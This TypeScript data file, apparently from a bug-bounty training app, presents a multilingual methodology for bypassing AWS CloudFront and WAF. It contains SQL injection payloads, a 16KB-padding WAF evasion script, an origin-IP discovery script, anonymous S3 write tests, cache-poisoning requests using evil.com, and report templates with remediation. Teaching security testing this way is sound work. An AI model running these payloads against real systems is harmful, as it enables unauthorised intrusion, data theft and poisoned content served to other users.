// ─── 2. 5-PHASE METHODOLOGY FOR AWS TARGETS ──────────────────────────────────
export const AWS_WAF_METHODOLOGY_PHASES: AwsWafPhase[] = [
  {
    phase: 1,
    title: {
      en: "Phase 1: AWS Architecture & CloudFront Reconnaissance",
      simple: "Phase 1: Detecting AWS CloudFront and Finding Infrastructure Clues",
      hi: "चरण 1: AWS आर्किटेक्चर और CloudFront की पहचान",
    },
    objective: {
      en: "Confirm the presence of AWS CloudFront, detect AWS WAF response headers, and map all public subdomains and asset endpoints.",
      simple: "Check if the website uses AWS CloudFront and look for WAF signatures.",
      hi: "जांचें कि क्या टारगेट AWS CloudFront और WAF का उपयोग कर रहा है।",
    },
    steps: [
      {
        en: "Inspect response headers for `Via: 1.1 ...cloudfront.net`, `X-Amz-Cf-Id`, `X-Amz-Cf-Pop`, and `Server: CloudFront`.",
        simple: "Look for cloudfront.net in the network response headers.",
        hi: "रिस्पॉन्स हेडर में `Via: cloudfront.net` और `X-Amz-Cf-Id` की जांच करें।",
      },
      {
        en: "Send a baseline forbidden probe (`/?x=<script>`) to capture the official AWS WAF block page (`403 Forbidden` with `x-amzn-waf-action: block`).",
        simple: "Send a test payload to see how AWS WAF blocks you.",
        hi: "एक टेस्ट पेलोड भेजकर देखें कि AWS WAF का ब्लॉक पेज कैसा दिखता है।",
      },
      {
        en: "Enumerate CNAME and DNS records to discover underlying CloudFront distribution domains (e.g. `d1234abcd.cloudfront.net`).",
        simple: "Find the cloudfront.net address in the website's DNS records.",
        hi: "DNS में `d1234abcd.cloudfront.net` जैसा क्लाउडफ्रंट डिस्ट्रीब्यूशन डोमेन ढूंढें।",
      },
    ],
    commandsOrPayloads: [
      `curl -I https://target.com/ | grep -iE 'via|x-amz|server'`,
      `dig target.com CNAME +short`,
      `curl -i "https://target.com/?test=<script>alert(1)</script>" | grep -i 'waf'`,
    ],
    keyTargets: [
      "Response headers (Via, X-Amz-Cf-Id)",
      "DNS CNAME records",
      "WAF block signatures (x-amzn-waf-action)",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: Origin ALB & Direct IP Discovery",
      simple: "Phase 2: Finding the Real AWS IP Behind CloudFront",
      hi: "चरण 2: असली ALB ऑरिजिन IP की खोज",
    },
    objective: {
      en: "Bypass the entire CloudFront WAF layer by hunting down the true Application Load Balancer (ALB) or EC2 origin IP address.",
      simple: "Find the secret AWS IP address so you can talk to the server directly without WAF.",
      hi: "CloudFront के पीछे छिपे असली ALB IP को ढूंढना ताकि WAF हट जाए।",
    },
    steps: [
      {
        en: "Run Censys and Shodan queries filtering for the target's SSL certificate Common Name on Amazon IP ranges.",
        simple: "Search Censys and Shodan for the website's SSL certificate on Amazon servers.",
        hi: "Shodan पर `ssl.cert.subject.CN:\"target.com\" org:\"Amazon.com\"` सर्च करें।",
      },
      {
        en: "Trigger server-side callbacks via webhook forms, avatar imports, or password reset links to capture the outbound AWS NAT IP.",
        simple: "Get the server to ping your link to see its real IP address.",
        hi: "वेबहुक या इमेज इम्पोर्ट में अपना लिंक डालकर सर्वर का असली IP पकड़ें।",
      },
      {
        en: "Validate discovered IPs by sending an HTTPS request with `Host: target.com` to see if the origin serves the application directly.",
        simple: "Test the IP with curl and the website's Host header.",
        hi: "प्राप्त IP पर Target का Host हेडर लगाकर curl करें।",
      },
    ],
    commandsOrPayloads: [
      `shodan search 'ssl.cert.subject.CN:"target.com" org:"Amazon.com"' --fields ip_str`,
      `curl -ik -H "Host: target.com" https://<DISCOVERED_IP>/`,
      `ffuf -u https://<DISCOVERED_IP>/FUZZ -H "Host: target.com" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt`,
    ],
    keyTargets: [
      "Shodan / Censys SSL cert matches",
      "Outbound SSRF / Webhook callbacks",
      "ALB DNS names (*.elb.amazonaws.com)",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: S3 Bucket Permissions & Origin Access Control (OAC)",
      simple: "Phase 3: Checking S3 Storage Buckets for Open Doors",
      hi: "चरण 3: S3 बकेट की अनुमतियों और OAC की जांच",
    },
    objective: {
      en: "Discover whether static assets and media are served from an Amazon S3 bucket with missing or misconfigured access controls.",
      simple: "See if company files are stored in an unprotected Amazon S3 bucket.",
      hi: "जांचें कि क्या कंपनी की फाइलें किसी असुरक्षित S3 बकेट में हैं।",
    },
    steps: [
      {
        en: "Induce 404/403 XML errors to extract the underlying S3 bucket name.",
        simple: "Trigger a 404 error to see if the bucket name is leaked in the error.",
        hi: "404 एरर पैदा करके S3 बकेट का नाम खोजें।",
      },
      {
        en: "Test anonymous read permissions via `aws s3 ls s3://<bucket> --no-sign-request`.",
        simple: "Check if you can list files without signing in.",
        hi: "बिना पासवर्ड के बकेट की फाइलों की लिस्ट देखने की कोशिश करें।",
      },
      {
        en: "Test write permissions: attempt uploading a proof file to detect supply-chain takeover vectors.",
        simple: "Check if you can upload a file into their bucket.",
        hi: "बकेट में सुरक्षित टेस्ट फाइल अपलोड करके राइट परमिशन जांचें।",
      },
    ],
    commandsOrPayloads: [
      `aws s3 ls s3://<BUCKET_NAME> --no-sign-request`,
      `aws s3 cp test.txt s3://<BUCKET_NAME>/test.txt --no-sign-request`,
      `curl -i https://<BUCKET_NAME>.s3.amazonaws.com/?list-type=2`,
    ],
    keyTargets: [
      "S3 Bucket ACLs (AllUsers Read/Write)",
      "Unrestricted s3:GetObject & s3:PutObject",
      "Direct S3 HTTP endpoints (*.s3.amazonaws.com)",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: AWS WAF Rule Evasion & 16KB Body Padding",
      simple: "Phase 4: Bypassing WAF Filters with 16KB Request Padding",
      hi: "चरण 4: 16KB पैडिंग और एन्कोडिंग से WAF को बायपास करना",
    },
    objective: {
      en: "Bypass AWS WAF inspection rules on JSON, GraphQL, and Multipart endpoints by pushing payloads past the 16KB body inspection boundary.",
      simple: "Hide attacks after 16KB of dummy text so AWS WAF stops inspecting.",
      hi: "16KB का फालतू डेटा आगे रखकर WAF की स्कैनिंग सीमा को पार करना।",
    },
    steps: [
      {
        en: "Test endpoint with standard injection to verify WAF blocking.",
        simple: "Check that the WAF blocks your test injection.",
        hi: "जांचें कि WAF आपके टेस्ट पेलोड को ब्लॉक कर रहा है।",
      },
      {
        en: "Prepend 16,500 bytes of dummy JSON or form parameters before the injection parameter.",
        simple: "Add 16,500 characters of dummy text in front of your attack.",
        hi: "अटैक से पहले 16,500 अक्षरों का फालतू डेटा जोड़ें।",
      },
      {
        en: "Verify backend execution: 200 OK or database errors confirm the WAF was bypassed.",
        simple: "If the server processes your request without a 403, the bypass worked.",
        hi: "यदि 403 के बजाय 200 OK मिलता है, तो बाईपास सफल हुआ।",
      },
    ],
    commandsOrPayloads: [
      `python3 -c 'print("A"*16500)'`,
      `curl -X POST -H "Content-Type: application/json" -d '{"pad":"[16KB_A]","inject":"' OR 1=1--"}' https://target.com/api`,
    ],
    keyTargets: [
      "JSON API endpoints",
      "GraphQL mutation queries",
      "Multipart file upload forms",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: CloudFront Edge Cache Poisoning & Header Smuggling",
      simple: "Phase 5: Poisoning the CloudFront CDN Cache for Stored Impact",
      hi: "चरण 5: CloudFront कैश पॉइज़निंग और हेडर स्मगलिंग",
    },
    objective: {
      en: "Exploit unkeyed headers and path discrepancies to poison CloudFront edge caches, delivering malicious redirects or scripts to victim users.",
      simple: "Trick CloudFront's cache into storing a bad response that harms other users.",
      hi: "CloudFront कैश को दूषित करना ताकि आम यूज़र्स को नुकसान पहुंचे।",
    },
    steps: [
      {
        en: "Identify unkeyed headers supported by backend: `X-Forwarded-Host`, `X-Original-URL`, `CloudFront-Viewer-Country`.",
        simple: "Find headers that change the page without being part of the cache key.",
        hi: "ऐसे हेडर्स ढूंढें जो पेज बदल देते हैं लेकिन कैश की में शामिल नहीं होते।",
      },
      {
        en: "Send poisoned request with malicious host header: `X-Forwarded-Host: evil.com`.",
        simple: "Send a request telling the server to use your malicious domain.",
        hi: "`X-Forwarded-Host: evil.com` भेजकर रिस्पॉन्स में अपना डोमेन लाएं।",
      },
      {
        en: "Verify the cached response: request the URL normally to confirm that CloudFront serves the poisoned response with `X-Cache: Hit from cloudfront`.",
        simple: "Check if other users visiting the page get your poisoned version.",
        hi: "पुष्टि करें कि CloudFront अब सभी को दूषित रिस्पॉन्स दे रहा है।",
      },
    ],
    commandsOrPayloads: [
      `curl -i -H "X-Forwarded-Host: evil.com" https://target.com/assets/config.js`,
      `curl -i https://target.com/assets/config.js | grep -i 'x-cache'`,
    ],
    keyTargets: [
      "Unkeyed headers (X-Forwarded-Host, X-Host)",
      "CloudFront cache hits (X-Cache: Hit from cloudfront)",
      "Dynamic JS and JSON endpoints cached by CDN",
    ],
  },
];

// ─── 3. AUTOMATION SCRIPTS & TOOLS STASH ──────────────────────────────────────
export const AWS_WAF_TOOLS_STASH: AwsWafToolSnippet[] = [
  {
    id: "aws-alb-origin-scanner",
    title: {
      en: "AWS ALB Direct Origin Discovery & Verification Tool",
      simple: "Automated Script to Find and Test Direct ALB IPs Behind CloudFront",
      hi: "ALB डायरेक्ट ऑरिजिन खोज और ऑटोमेटेड वेरिफिकेशन टूल",
    },
    description: {
      en: "This Bash script queries Shodan and Censys APIs for SSL certificates matching the target domain, then automatically issues curl probes with the proper 'Host' header to verify if the ALB responds directly without CloudFront WAF protection.",
      simple: "A handy script that searches Shodan for your target's SSL certificate and tests if the raw AWS IP lets you bypass CloudFront.",
      hi: "यह बैश स्क्रिप्ट Shodan से टारगेट के SSL सर्टिफ़िकेट वाले IPs निकालती है और curl से टेस्ट करके बताती है कि WAF बाईपास हुआ या नहीं।",
    },
    category: "bash_scanner",
    language: "bash",
    code: `#!/usr/bin/env bash
# ==============================================================================
# AWS ALB Direct Origin Hunter & WAF Bypass Verifier
# Usage: ./aws_alb_hunter.sh <target-domain> <shodan-api-key>
# ==============================================================================

TARGET="$1"
SHODAN_KEY="$2"

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <target.com> [shodan_api_key]"
  exit 1
fi

echo -e "\\033[1;34m[*] Hunting Origin ALB IPs for: $TARGET\\033[0m"

# 1. Fetch CloudFront baseline hash
echo "[*] Fetching CloudFront baseline response..."
CF_BASELINE=$(curl -sk -m 5 "https://$TARGET/" | md5sum | cut -d' ' -f1)
echo "    CloudFront MD5: $CF_BASELINE"

# 2. Query Shodan for SSL cert matching target on AWS
if [ -n "$SHODAN_KEY" ]; then
  echo "[*] Querying Shodan API for AWS IPs with cert: $TARGET..."
  CANDIDATE_IPS=$(curl -s "https://api.shodan.io/shodan/host/search?key=$SHODAN_KEY&query=ssl.cert.subject.CN:%22$TARGET%22+org:%22Amazon.com%22" | jq -r '.matches[].ip_str' | sort -u)
else
  echo "[!] No Shodan key provided. Using local dig / history heuristics..."
  CANDIDATE_IPS=$(dig +short "$TARGET" | grep -v 'cloudfront.net' || true)
fi

# 3. Test each candidate IP
for IP in $CANDIDATE_IPS; do
  echo -e "\\n[*] Probing IP: $IP"
  RESP=$(curl -sik -m 5 -H "Host: $TARGET" "https://$IP/" 2>/dev/null)
  
  if [ -z "$RESP" ]; then
    echo "    [-] No HTTPS response or timeout on $IP"
    continue
  fi

  STATUS=$(echo "$RESP" | head -n 1 | cut -d' ' -f2)
  SERVER=$(echo "$RESP" | grep -i '^server:' | tr -d '\\r')
  VIA=$(echo "$RESP" | grep -i '^via:' | tr -d '\\r')
  BODY_HASH=$(echo "$RESP" | sed '1,/^\\r*$/d' | md5sum | cut -d' ' -f1)

  echo "    HTTP Status: $STATUS | Server: $SERVER"

  # If Via: cloudfront is absent, we hit the origin directly!
  if [[ "$VIA" != *"cloudfront"* ]] && [ "$STATUS" == "200" ]; then
    echo -e "    \\033[1;32m[+] POTENTIAL ORIGIN BYPASS FOUND!\\033[0m"
    echo "        Target IP : $IP"
    echo "        Via Header: (None / Origin Server)"
    echo "        Hash Match: $([ "$BODY_HASH" == "$CF_BASELINE" ] && echo "Exact Body Match!" || echo "Partial Difference")"
    echo "        Test Command: curl -k -H 'Host: $TARGET' https://$IP/"
  else
    echo "    [-] Request routed through CloudFront or returned non-200"
  fi
done`,
    howToUse: {
      en: "Make executable: `chmod +x aws_alb_hunter.sh` and run: `./aws_alb_hunter.sh target.com YOUR_SHODAN_KEY`.",
      simple: "Run the script with your target domain and Shodan key to automatically find direct ALB servers.",
      hi: "`chmod +x` करके स्क्रिप्ट चलाएं: `./aws_alb_hunter.sh target.com YOUR_KEY`।",
    },
  },
  {
    id: "aws-waf-16kb-body-padder",
    title: {
      en: "AWS WAF 16KB Inspection Limit Python Exploit Padder",
      simple: "Python Tool to Automatically Pad JSON Requests Past 16KB",
      hi: "AWS WAF 16KB इंस्पेक्शन लिमिट पैडिंग टूल (Python)",
    },
    description: {
      en: "Takes any HTTP POST JSON body and automatically injects a dummy padding field of 16,500 bytes before the attack payload to verify whether AWS WAF stops inspecting and allows the injection to execute on the backend.",
      simple: "Automatically adds 16.5KB of padding to your JSON request so AWS WAF lets your payload pass through.",
      hi: "यह पायथन टूल किसी भी JSON रिक्वेस्ट में 16.5KB पैडिंग जोड़ देता है ताकि AWS WAF पेलोड को स्कैन किए बिना जाने दे।",
    },
    category: "python_fuzzer",
    language: "python",
    code: `#!/usr/bin/env python3
"""
AWS WAF 16KB Body Inspection Limit Bypass Tester
Pads JSON requests past the 16,384-byte boundary to bypass AWS WAF rulesets.
"""

import sys
import json
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_waf_bypass(url, target_param, payload):
    print(f"[*] Target URL: {url}")
    print(f"[*] Testing parameter: {target_param}")
    print(f"[*] Injection payload: {payload}\\n")

    # 1. Baseline standard attack (should be blocked by AWS WAF)
    baseline_data = {target_param: payload}
    print("[1] Sending unpadded attack request...")
    try:
        r1 = requests.post(url, json=baseline_data, verify=False, timeout=10)
        print(f"    Response Status: {r1.status_code}")
        if r1.status_code == 403 or "x-amzn-waf-action" in r1.headers:
            print("    [!] Blocked by AWS WAF as expected (403 Forbidden)")
        else:
            print("    [?] Not blocked by WAF initially. Proceeding to test padding anyway.")
    except Exception as e:
        print(f"    Error: {e}")

    # 2. Padded request (>16,384 bytes)
    # 16,500 'A' characters pushes the second parameter past the 16KB inspection window
    padded_data = {
        "_waf_bypass_pad": "A" * 16500,
        target_param: payload
    }
    raw_len = len(json.dumps(padded_data))
    print(f"\\n[2] Sending padded attack request (Total Body Size: {raw_len} bytes)...")
    try:
        r2 = requests.post(url, json=padded_data, verify=False, timeout=10)
        print(f"    Response Status: {r2.status_code}")
        print(f"    WAF Action Header: {r2.headers.get('x-amzn-waf-action', 'None')}")
        
        if r2.status_code == 200:
            print("\\033[1;32m[+] SUCCESS! AWS WAF inspection limit bypassed (200 OK received)!\\033[0m")
            print("    Backend processed payload while WAF inspection stopped at 16KB.")
        elif r2.status_code == 500:
            print("\\033[1;33m[+] POTENTIAL INJECTION! Backend returned 500 Internal Error (SQL syntax error).\\033[0m")
        else:
            print(f"    [-] Received status {r2.status_code}. Target might have 64KB inspection or dropped oversized body.")
    except Exception as e:
        print(f"    Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <https://target.com/api/endpoint> <param_name> <payload>")
        print(f"Example: {sys.argv[0]} https://target.com/api/search q 'OR 1=1--'")
        sys.exit(1)

    test_waf_bypass(sys.argv[1], sys.argv[2], sys.argv[3])`,
    howToUse: {
      en: "Run: `python3 aws_waf_padder.py https://target.com/api/login username \"admin' OR 1=1--\"`",
      simple: "Run the python script specifying the endpoint, the vulnerable parameter, and your payload.",
      hi: "`python3 aws_waf_padder.py <URL> <पैरामीटर> <पेलोड>` लिखकर चलाएं।",
    },
  },
  {
    id: "s3-oac-security-auditor",
    title: {
      en: "S3 Bucket Origin Access Control (OAC) Auditor",
      simple: "One-Liner Tool to Check S3 Bucket Open Read and Write Permissions",
      hi: "S3 बकेट परमिशन और राइट एक्सेस ऑडिटर स्क्रिप्ट",
    },
    description: {
      en: "Tests whether an identified origin S3 bucket allows anonymous read, object listing, or write operations, completely bypassing CloudFront CDN protection.",
      simple: "Checks if the S3 bucket behind CloudFront lets anyone view or overwrite files.",
      hi: "जांचता है कि क्या CloudFront के पीछे वाली S3 बकेट में कोई भी फाइलें पढ़ या बदल सकता है।",
    },
    category: "bash_scanner",
    language: "bash",
    code: `#!/usr/bin/env bash
# Quick S3 Permission Check for CloudFront Origins
BUCKET="$1"

if [ -z "$BUCKET" ]; then
  echo "Usage: $0 <bucket-name>"
  exit 1
fi

echo "[*] Testing S3 Bucket: $BUCKET"

echo -e "\\n[1] Testing Anonymous Object Listing (?list-type=2)..."
curl -s "https://$BUCKET.s3.amazonaws.com/?list-type=2" | head -n 15

echo -e "\\n[2] Testing AWS CLI Anonymous List..."
aws s3 ls "s3://$BUCKET" --no-sign-request 2>&1 | head -n 10

echo -e "\\n[3] Testing Anonymous File Upload (PUT permission)..."
echo "Security Audit Proof" > /tmp/audit_test.txt
aws s3 cp /tmp/audit_test.txt "s3://$BUCKET/audit_test_proof.txt" --no-sign-request 2>&1
if [ $? -eq 0 ]; then
  echo -e "\\033[1;31m[CRITICAL] Anonymous Write Permission ENABLED on S3 Bucket!\\033[0m"
else
  echo "[-] Anonymous write blocked."
fi
rm -f /tmp/audit_test.txt`,
    howToUse: {
      en: "Run: `./s3_audit.sh target-company-assets` to check for open read/write permissions.",
      simple: "Run the script with the S3 bucket name to test for open permissions.",
      hi: "`./s3_audit.sh <बकेट_नाम>` चलाकर देखें कि क्या फाइलें सुरक्षित हैं।",
    },
  },
];

// ─── 4. HIGH-YIELD BUG BOUNTY REPORT TEMPLATES ───────────────────────────────
export const AWS_WAF_REPORT_TEMPLATES: AwsWafReportTemplate[] = [
  {
    id: "alb-direct-origin-p1",
    title: {
      en: "P1 / Critical: Direct Application Load Balancer (ALB) Origin Access Bypassing AWS WAF WebACL",
      simple: "P1: Direct Server Access Bypassing Entire AWS WAF",
      hi: "P1 / क्रिटिकल: डायरेक्ट ALB एक्सेस से AWS WAF का पूर्ण बाईपास",
    },
    vulnType: "Security Misconfiguration / WAF Bypass",
    cvss: "8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)",
    severity: "critical",
    reportMarkdown: `## Summary
During the security assessment of **{TARGET_DOMAIN}**, it was discovered that the backend Application Load Balancer (ALB) is directly accessible from the public internet without enforcing CloudFront Origin Access restrictions or AWS WAF WebACL inspection.

While the primary public domain \`https://{TARGET_DOMAIN}\` is protected by AWS CloudFront and AWS WAF Managed Rules, attackers can bypass all rate limiting, geo-fencing, and WAF inspection rules by directing requests directly to the origin IP address **{ALB_IP}** with a spoofed \`Host: {TARGET_DOMAIN}\` header.

## Root Cause
The backend AWS Application Load Balancer security group permits inbound HTTP/HTTPS traffic from \`0.0.0.0/0\` and lacks an HTTP header evaluation rule to verify an \`X-Origin-Verify\` / \`X-Amz-Custom-Header\` shared secret configured on the CloudFront distribution.

## Vulnerability Details
- **Target Domain:** \`https://{TARGET_DOMAIN}\`
- **Origin ALB IP Address:** \`{ALB_IP}\`
- **Missing Header Check:** \`X-Amz-Custom-Header\`
- **WAF Bypass Demonstration:** Requests containing prohibited SQLi strings that are blocked with HTTP 403 by CloudFront succeed with HTTP 200 when sent to the ALB IP.

## Proof of Concept (PoC)

### Step 1: Standard WAF-Protected Request (Blocked)
\`\`\`bash
curl -ik "https://{TARGET_DOMAIN}/api/users?id=1' OR '1'='1"
\`\`\`
**Response:**
\`\`\`http
HTTP/2 403 Forbidden
Server: CloudFront
x-amzn-waf-action: block
x-amz-cf-id: vQ4X9_abc123...
\`\`\`

### Step 2: Direct ALB Origin Request (Bypassed)
\`\`\`bash
curl -ik -H "Host: {TARGET_DOMAIN}" "https://{ALB_IP}/api/users?id=1' OR '1'='1"
\`\`\`
**Response:**
\`\`\`http
HTTP/1.1 200 OK
Server: awselb/2.0
Content-Type: application/json

{"status": "success", "users": [...]}
\`\`\`

## Impact
An attacker can perform unrestricted automated attacks against backend services, including:
1. SQL injection, remote code execution, and path traversal without WAF filtering.
2. High-speed credential stuffing and password brute forcing bypassing CloudFront rate limits.
3. Unrestricted DoS attacks directly stressing origin web servers.

## Remediation & Mitigation
1. **Enforce Custom Origin Headers:** In CloudFront Origin Settings, add a custom header (e.g. \`X-Origin-Verify: <cryptographic-secret>\`). Configure listener rules on the ALB to return a 403 Forbidden response if this header is missing or invalid.
2. **Restrict ALB Security Groups to CloudFront Prefix Lists:** Configure the ALB security group inbound rules to allow traffic *only* from the AWS-managed prefix list \`com.amazonaws.global.cloudfront.origin-facing\`.
3. **Attach AWS WAF Directly to the ALB:** Attach an AWS WAF WebACL directly to the regional Application Load Balancer in addition to CloudFront for defense-in-depth.`,
  },
  {
    id: "aws-waf-body-limit-p2",
    title: {
      en: "P2 / High: AWS WAF Inspection Bypass via Request Body Padding (>16KB Payload Window)",
      simple: "P2: Bypassing AWS WAF Filters by Exceeding 16KB Inspection Limit",
      hi: "P2 / हाई: 16KB से बड़े डेटा पैडिंग के जरिए AWS WAF इंस्पेक्शन बाईपास",
    },
    vulnType: "WAF Rule Evasion",
    cvss: "7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)",
    severity: "high",
    reportMarkdown: `## Summary
An inspection limit evasion vulnerability was identified in the AWS WAF configuration protecting **{TARGET_DOMAIN}**. By prepending benign padding data exceeding 16,384 bytes (16KB) to JSON request bodies, attackers can bypass AWS WAF Managed Rule Sets (\`AWSManagedRulesSQLiRuleSet\` and \`AWSManagedRulesCommonRuleSet\`), allowing prohibited payloads to be parsed and executed by backend services.

## Technical Details
AWS WAF inspects up to 16KB (16,384 bytes) of the request body by default. If the WebACL rule evaluation is configured with "Oversize Handling: Continue", any data located after byte 16,384 is forwarded to the application server without inspection.

## Proof of Concept

### Request 1: Direct Attack (Blocked by WAF)
\`\`\`http
POST /api/v1/search HTTP/1.1
Host: {TARGET_DOMAIN}
Content-Type: application/json

{"query": "' UNION SELECT NULL, @@version--"}
\`\`\`
**Response:** \`HTTP/1.1 403 Forbidden\` (\`x-amzn-waf-action: block\`)

### Request 2: Padded Attack Exceeding 16KB (Bypassed)
\`\`\`http
POST /api/v1/search HTTP/1.1
Host: {TARGET_DOMAIN}
Content-Type: application/json

{
  "_padding": "[16,500 bytes of dummy character 'A']",
  "query": "' UNION SELECT NULL, @@version--"
}
\`\`\`
**Response:** \`HTTP/1.1 200 OK\` with database results returned.

## Remediation
1. **Enable AWS WAF 64KB Body Inspection:** On supported CloudFront distributions, upgrade body inspection limits from 16KB to 64KB.
2. **Configure Oversize Handling to 'Block':** In AWS WAF rules, change the Oversize Handling action from 'Continue' to 'Drop' or 'Block' for endpoints that should never receive payloads larger than 16KB.
3. **Enforce Backend Input Validation:** Do not rely solely on WAF edge inspection; enforce parameterized database queries and strict schema validation in the application layer.`,
  },
];
